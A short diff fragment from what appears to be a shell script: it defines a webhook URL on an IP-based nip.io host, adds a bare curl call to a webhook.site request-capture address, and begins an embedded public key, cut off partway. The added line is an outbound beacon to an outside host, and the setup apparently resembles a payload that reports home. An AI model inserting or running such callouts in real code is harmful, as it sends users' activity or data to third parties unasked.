@@ -1,5 +1,7 @@
 webhook="https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff"
 
+curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87
+
 PUB_KEY='-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt9hnfNHb9MVC0diYp3hr
 5o9hsJAq1DiDSOITsCG3ostdPtCNIY+GPfK2IwQQx5XbMV0CLih4ifr7pJTV4Bl0
